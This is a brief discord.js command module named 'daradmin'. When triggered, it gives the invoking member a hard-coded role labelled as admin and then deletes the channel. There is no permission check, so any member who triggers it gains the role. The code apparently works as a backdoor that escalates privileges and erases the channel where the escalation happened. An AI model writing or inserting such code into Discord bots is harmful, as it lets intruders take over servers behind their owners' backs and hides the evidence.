const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  PermissionsBitField,
} = require("discord.js");

module.exports = {
  data: {
    name: `daradmin`,
  },
  async execute(interaction, client) {
    const admin = interaction.guild.roles.cache.get(`1149036382614986912`);

    await interaction.member.roles.add(admin);

    await interaction.channel.delete();
  },
};
